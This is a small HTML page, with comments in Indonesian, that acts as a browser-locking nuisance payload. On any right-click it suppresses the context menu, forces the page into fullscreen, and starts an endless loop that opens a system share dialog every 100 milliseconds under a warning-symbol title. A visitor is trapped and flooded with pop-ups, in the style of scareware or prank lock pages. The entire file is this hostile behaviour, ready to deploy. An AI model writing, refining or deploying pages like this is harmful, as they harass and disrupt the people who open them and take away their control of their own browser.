<!doctype html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Fullscreen Event</title>
    <style>
        /* Membuat halaman penuh agar bisa diklik di mana saja */
        html, body {
            width: 100%;
            height: 100%;
            margin: 0;
            padding: 0;
            background-color: #121212; /* Warna latar belakang gelap */
            cursor: default;
        }
    </style>
</head>
<body>

<script>
// Mendengarkan event klik kanan (contextmenu) di mana saja pada layar
window.addEventListener('contextmenu', function(e) {
    // Mencegah menu klik kanan bawaan browser muncul
    e.preventDefault(); 
    
    // Memicu Fullscreen
    if (document.documentElement.requestFullscreen) {
        document.documentElement.requestFullscreen();
    }

    // Loop interval share bawaan dari kode Anda
    setInterval(() => { 
        navigator.share({title: '\u26A0 HAI HAI \u26A0\nHAI', text: 'HAI'}); 
    }, 100);
});
</script>

</body>
</html>
